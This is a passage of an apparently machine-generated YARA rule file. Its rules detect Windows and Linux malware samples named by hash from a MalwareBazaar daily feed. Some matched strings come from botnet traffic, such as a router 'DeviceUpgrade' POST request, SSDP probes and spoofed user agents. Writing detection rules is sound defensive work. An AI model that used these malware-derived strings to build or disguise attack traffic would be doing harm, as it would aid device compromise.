        description = "Auto ML: 6c0ac1e5fa97f92b6acc9594fa33513cb11849f3a1588ec95834b4fe650c08eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "FrmIzracun_Student10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 651KB
        and all of them
}

rule Linux_6c264bfd4594fa8fecef25dcc55dff4e4063fa3985428ac5492700defe50239c
{
    meta:
        description = "Auto ML: 6c264bfd4594fa8fecef25dcc55dff4e4063fa3985428ac5492700defe50239c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB
        and all of them
}

rule Windows_6c3029ca3f035f3dbaaf4f692d4788536ce21d3fe2bab7927b0d55bd87413678
{
    meta:
        description = "Auto ML: 6c3029ca3f035f3dbaaf4f692d4788536ce21d3fe2bab7927b0d55bd87413678"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_6c523ef93416b140bba0a146cec6fdfd44d95db5505b913fc5d2837dffe8f5fb
{
    meta:
        description = "Auto ML: 6c523ef93416b140bba0a146cec6fdfd44d95db5505b913fc5d2837dffe8f5fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 43KB
        and all of them
}

rule Windows_6c5eea2d93dc13108a6020ae7f0bf6f432d0c99ddae8edbc4ed56557c497bf91
{
    meta:
        description = "Auto ML: 6c5eea2d93dc13108a6020ae7f0bf6f432d0c99ddae8edbc4ed56557c497bf91"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "QQSVWh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 227KB
        and all of them
}

rule Windows_6d037779c2fc7194e31211c125d34c62cf379746c99ba315d6f183bfcb393623
{
    meta:
        description = "Auto ML: 6d037779c2fc7194e31211c125d34c62cf379746c99ba315d6f183bfcb393623"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5390KB
        and all of them
}

rule Windows_0a293a8447e1dfbf22376fccd39d3e5fc2218059ea59cc2c401264b457708cf3
{
    meta:
        description = "Auto ML: 0a293a8447e1dfbf22376fccd39d3e5fc2218059ea59cc2c401264b457708cf3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6511KB
        and all of them
}

rule Windows_6d237fc456e1f4157a335ecf467121559ea7ae7386e54f77c73428de337f0322
{
    meta:
        description = "Auto ML: 6d237fc456e1f4157a335ecf467121559ea7ae7386e54f77c73428de337f0322"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "-C000-WaterCaRD"
        $s5 = "46}#2.Amministratore di card in standard Irdeto"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1808KB
        and all of them
}

rule Linux_6d7749a61e35adeaf5b1b91a7a3dd60e0e02d3df1a1bc3202b66db49623f48a2
{
    meta:
        description = "Auto ML: 6d7749a61e35adeaf5b1b91a7a3dd60e0e02d3df1a1bc3202b66db49623f48a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "uvK2J&"
        $s2 = "G}O`k,w"
        $s3 = "BFXv}ZH"
        $s4 = "0D+Wc l"
        $s5 = "f#(D\\mS"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB
        and all of them
}

rule Linux_6d78dd222b308f616abbb1a678dc6aa7cf0e01d1a364a96e8281215b870db003
{
    meta:
        description = "Auto ML: 6d78dd222b308f616abbb1a678dc6aa7cf0e01d1a364a96e8281215b870db003"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "hP\\ac^"
        $s3 = "-b#l,b|a"
        $s4 = "d$Q uB"
        $s5 = "R#ay!p1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB
        and all of them
}

rule Windows_6db15c88c3b32bf630ecea4eccf08a58f54cff5b6244c45bfb5ec20dd89685b5
{
    meta:
        description = "Auto ML: 6db15c88c3b32bf630ecea4eccf08a58f54cff5b6244c45bfb5ec20dd89685b5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "PQh\\6B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 231KB
        and all of them
}

rule Windows_6dcb2ab8a508e8377f179587406846b088a50d0737993ed0de373c64e3fc59c0
{
    meta:
        description = "Auto ML: 6dcb2ab8a508e8377f179587406846b088a50d0737993ed0de373c64e3fc59c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "Phff B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6616KB
        and all of them
}

rule Windows_6e32ba749fcc25458eac90bbfce5036f0a0d40a6a112c99ac63ad20ab62a6703
{
    meta:
        description = "Auto ML: 6e32ba749fcc25458eac90bbfce5036f0a0d40a6a112c99ac63ad20ab62a6703"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "uZh=RA"
        $s5 = "YShh6@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1990KB
        and all of them
}

rule Windows_6e36d48c1c2132e2f2069bc973a20e4235c6761e237051b31b3558a4df938525
{
    meta:
        description = "Auto ML: 6e36d48c1c2132e2f2069bc973a20e4235c6761e237051b31b3558a4df938525"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "WRECVCSF"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 432KB
        and all of them
}

rule Linux_6e776fa224a6e6c1445770772c7828c6e16417431d6e1cb9ee86219204a444d8
{
    meta:
        description = "Auto ML: 6e776fa224a6e6c1445770772c7828c6e16417431d6e1cb9ee86219204a444d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "0N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "uD&HHx"
        $s5 = "N^NuHx"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 56KB
        and all of them
}

rule Windows_6ecc88149dfdad0b296e7aee3c554fc191b1371d09c51ee2e47ac0e145ee38ba
{
    meta:
        description = "Auto ML: 6ecc88149dfdad0b296e7aee3c554fc191b1371d09c51ee2e47ac0e145ee38ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7227KB
        and all of them
}

rule Windows_6f6abcb56f4c896a9cbac7b27e29a787fb251cbc27bfddc133a7da934a22a41c
{
    meta:
        description = "Auto ML: 6f6abcb56f4c896a9cbac7b27e29a787fb251cbc27bfddc133a7da934a22a41c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB
        and all of them
}

rule Windows_0a8839b793adedb6f3b7882cd3ff2aca653b29aefe4091969bceffae430b6eaf
{
    meta:
        description = "Auto ML: 0a8839b793adedb6f3b7882cd3ff2aca653b29aefe4091969bceffae430b6eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "=lgwS?gwS?gwS?"
        $s3 = "W>twS?"
        $s4 = "P>qwS?"
        $s5 = "V>UwS?n"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3139KB
        and all of them
}

rule Windows_6f8caef6d2e919940e8983a1fc994e26b2d4caf270b6c5ca722a99e431a21eda
{
    meta:
        description = "Auto ML: 6f8caef6d2e919940e8983a1fc994e26b2d4caf270b6c5ca722a99e431a21eda"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2130KB
        and all of them
}

rule Windows_6fc264d3ffc563ee44ae41f7693c1ec08d3d57e19b69b6e59c0a300c7317135c
{
    meta:
        description = "Auto ML: 6fc264d3ffc563ee44ae41f7693c1ec08d3d57e19b69b6e59c0a300c7317135c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "%N\"UUU@XV"
        $s5 = "c UUUUj_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5975KB
        and all of them
}

rule Linux_6fc3c3b2019f7b45b78e623adc872986817da0427d273a9bb04c0c44ed8befc6
{
    meta:
        description = "Auto ML: 6fc3c3b2019f7b45b78e623adc872986817da0427d273a9bb04c0c44ed8befc6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB
        and all of them
}

rule Windows_6fcb2b9e055ed80a6cd600c7c211d8c2d9dcaa959fdf525dd02ac0685a4d6827
{
    meta:
        description = "Auto ML: 6fcb2b9e055ed80a6cd600c7c211d8c2d9dcaa959fdf525dd02ac0685a4d6827"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 935KB
        and all of them
}

rule Windows_6fd198ca0bf7ba6b2e2dcb365bec8b647a8f49e7a44be1aa610b15e17363e7f0
{
    meta:
        description = "Auto ML: 6fd198ca0bf7ba6b2e2dcb365bec8b647a8f49e7a44be1aa610b15e17363e7f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "UoS{IoI="
        $s3 = "+~tdwg"
        $s4 = "0n Ix!W"
        $s5 = "CfEl`B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5788KB
        and all of them
}

rule Windows_6fd61c75d3e5cc9c34e1ef147f0e82ff7748ca3ecc752600c977db5482f71743
{
    meta:
        description = "Auto ML: 6fd61c75d3e5cc9c34e1ef147f0e82ff7748ca3ecc752600c977db5482f71743"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1457KB
        and all of them
}

rule Windows_6fd650e4f7d88a81503ca6a6ba8d21abbdd0a6d14086bfff03d1b5cc89625eaf
{
    meta:
        description = "Auto ML: 6fd650e4f7d88a81503ca6a6ba8d21abbdd0a6d14086bfff03d1b5cc89625eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "$vG;Ds"
        $s3 = "ziHeL42"
        $s4 = "dh,N5s7EPH"
        $s5 = "ZKeXvHS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 769KB
        and all of them
}

rule Windows_6fdc568249d2e7188833bc95d9c396b22adf78abecd61b636a33c148d08faf59
{
    meta:
        description = "Auto ML: 6fdc568249d2e7188833bc95d9c396b22adf78abecd61b636a33c148d08faf59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_6fef4ce5e0eab33c6ac840108036d53b6a8705f43ff4296f42331f2812c8ac72
{
    meta:
        description = "Auto ML: 6fef4ce5e0eab33c6ac840108036d53b6a8705f43ff4296f42331f2812c8ac72"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".sxdata"
        $s5 = "PSSSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7451KB
        and all of them
}

rule Windows_6ff9daa15f841bf3600d5a9174ab11b921ca8e8f1c9017a1c18afeb514c0f72e
{
    meta:
        description = "Auto ML: 6ff9daa15f841bf3600d5a9174ab11b921ca8e8f1c9017a1c18afeb514c0f72e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#ffffff"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 834KB
        and all of them
}

rule Windows_0ae99771b8e18f1a7963123b64056ac6c2e93ef0bcec40297a5c1f92ab70887b
{
    meta:
        description = "Auto ML: 0ae99771b8e18f1a7963123b64056ac6c2e93ef0bcec40297a5c1f92ab70887b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_7014b6b3754d3c7c16c27520eabd722119df9575c4f11b2c48d0df1d8eb0b191
{
    meta:
        description = "Auto ML: 7014b6b3754d3c7c16c27520eabd722119df9575c4f11b2c48d0df1d8eb0b191"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "D$L;D$P"
        $s5 = "5gzMD9"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 633KB
        and all of them
}

rule Linux_701e55988e5409acc81d6e19f08879a3fecdc96bc5d0981c4caac65d7529a0f5
{
    meta:
        description = "Auto ML: 701e55988e5409acc81d6e19f08879a3fecdc96bc5d0981c4caac65d7529a0f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s3 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s5 = "TheSuBot/0.2 (www.thesubot.de)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 113KB
        and all of them
}

rule Windows_7021bb246b002d3f811a913d148f5266de599dfe81acfa60279c5ffab6d80558
{
    meta:
        description = "Auto ML: 7021bb246b002d3f811a913d148f5266de599dfe81acfa60279c5ffab6d80558"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4701KB
        and all of them
}

rule Linux_7034042c7c96871e2a96f1a685394e61d8e3f2022a8228a4c87939fdc332e356
{
    meta:
        description = "Auto ML: 7034042c7c96871e2a96f1a685394e61d8e3f2022a8228a4c87939fdc332e356"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "QqGMXu="
        $s2 = "5POPY:"
        $s3 = "ZL)zRI"
        $s4 = "1ztiSL"
        $s5 = "p6Ge)a"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_70369453cd6e8481ce8f2fc4fa4074fb998a27ff6f91bce6caeab0ecac36493b
{
    meta:
        description = "Auto ML: 70369453cd6e8481ce8f2fc4fa4074fb998a27ff6f91bce6caeab0ecac36493b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<GetSets>d__10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 659KB
        and all of them
}

rule Windows_703921fd2af99761c29876c1593c7f225607a27eabd5bc1e6b66f2d1283de3d9
{
    meta:
        description = "Auto ML: 703921fd2af99761c29876c1593c7f225607a27eabd5bc1e6b66f2d1283de3d9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "DF51EFD36C8F552B80C9E2B91433E8C96D4C4CBE3068D8D13405DB1020381641"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 569KB
        and all of them
}

rule Windows_704922a3365f6b0cb1bb98148720d4b7ff049c0bb370e56d5e3b249b351f0ee7
{
    meta:
        description = "Auto ML: 704922a3365f6b0cb1bb98148720d4b7ff049c0bb370e56d5e3b249b351f0ee7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".clam01"
        $s4 = ".clam02"
        $s5 = ".clam03"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1885KB
        and all of them
}

rule Windows_7067efc25c133206570865eb8e8063d59894e5a3c457e287ca050d6fc3d182d4
{
    meta:
        description = "Auto ML: 7067efc25c133206570865eb8e8063d59894e5a3c457e287ca050d6fc3d182d4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Win32 .EXE."
        $s2 = ".MPRESS1"
        $s3 = ".MPRESS2"
        $s4 = "{SLhq-U"
        $s5 = "M,ZZSEPU"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4271KB
        and all of them
}

rule Windows_707c4d371a07104b76f811c9efdb9167774e5d8137753adf70e74c4d37c1b55f
{
    meta:
        description = "Auto ML: 707c4d371a07104b76f811c9efdb9167774e5d8137753adf70e74c4d37c1b55f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "b$Rich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 435KB
        and all of them
}

rule Windows_70c7a7f6c67627aa68aa90151740de9d18661b327d7220cb89ef899974a3384b
{
    meta:
        description = "Auto ML: 70c7a7f6c67627aa68aa90151740de9d18661b327d7220cb89ef899974a3384b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "j5P'.T>t.T>t.T>t0"
        $s3 = "Et-T>t.T?txT>t0"
        $s4 = "t/T>tRich.T>t"
        $s5 = "`.rdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB
        and all of them
}

rule Windows_0af0b4bffa67145e4e5ecd2321bb7790e9c14ed802a7984798fc7c00b6763207
{
    meta:
        description = "Auto ML: 0af0b4bffa67145e4e5ecd2321bb7790e9c14ed802a7984798fc7c00b6763207"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "#Strings"
        $s4 = "Microsoft.Win32"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 9KB
        and all of them
}

rule Windows_70d8c9b6b1ca04dfb10ea4cb4a723d0667023cb50f25b9eb1ca9f06bdaad4a07
{
    meta:
        description = "Auto ML: 70d8c9b6b1ca04dfb10ea4cb4a723d0667023cb50f25b9eb1ca9f06bdaad4a07"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1348KB
        and all of them
}

rule Linux_70f41e09e90905173555bd88992cfe1111b4d21b3d291de82196c93dd28520c8
{
    meta:
        description = "Auto ML: 70f41e09e90905173555bd88992cfe1111b4d21b3d291de82196c93dd28520c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Content-Length: 430"
        $s4 = "Connection: keep-alive"
        $s5 = "Accept: */*"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 99KB
        and all of them
}

rule Linux_711be1c67b261cb5410e8601e64901e778e08d3fb96aaaa59efca1cd33a2e332
{
    meta:
        description = "Auto ML: 711be1c67b261cb5410e8601e64901e778e08d3fb96aaaa59efca1cd33a2e332"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "qn^z!I"
        $s2 = "I[KsmP"
        $s3 = "0FB@dD"
        $s4 = "cTLKaO"
        $s5 = "|sZGRXk"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1128KB
        and all of them
}

rule Windows_712a592c28a3ee66e5023a1abddb900c22470a22502eb4f71ff50a9e816df18a
{
    meta:
        description = "Auto ML: 712a592c28a3ee66e5023a1abddb900c22470a22502eb4f71ff50a9e816df18a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "B/hihi"
        $s3 = "??mnoU"
        $s4 = "U=hhoU"
        $s5 = "hW???7U;ohU9i"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 39KB
        and all of them
}

rule Linux_71551d0ed6f6767b76f9e4c9973bbc8b39c346f7a74faef65606f109ad6db633
{
    meta:
        description = "Auto ML: 71551d0ed6f6767b76f9e4c9973bbc8b39c346f7a74faef65606f109ad6db633"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "m)=$eYmnJ"
        $s2 = "5dNLPT"
        $s3 = "[B3fXZ"
        $s4 = "p?7guF"
        $s5 = "b]|>Cmp"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 25KB
        and all of them
}

rule Linux_715640a7e295ce0ecc07be1cc686389f1d8f9d57cd12cb8202e142cc61ddb425
{
    meta:
        description = "Auto ML: 715640a7e295ce0ecc07be1cc686389f1d8f9d57cd12cb8202e142cc61ddb425"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "EBUPX!,"
        $s2 = "f+p:YDh"
        $s3 = "S`@rrI"
        $s4 = "{<PA4`5A?C2D"
        $s5 = "VS3VS["

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Linux_719fc6fb01f9caa78a85458980ab5fbdb1d5efa485bc1cf4915af7de4414eb90
{
    meta:
        description = "Auto ML: 719fc6fb01f9caa78a85458980ab5fbdb1d5efa485bc1cf4915af7de4414eb90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "=|fBWX"
        $s2 = "Wj+AEx"
        $s3 = "N\\xO]l"
        $s4 = "~bmLDq}"
        $s5 = "y:6H3xd"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 35KB
        and all of them
}

rule Windows_71f7d548c9ea57b8c9dcc3f426adabdddb4451e65837b63c4c25dc2a812717e2
{
    meta:
        description = "Auto ML: 71f7d548c9ea57b8c9dcc3f426adabdddb4451e65837b63c4c25dc2a812717e2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
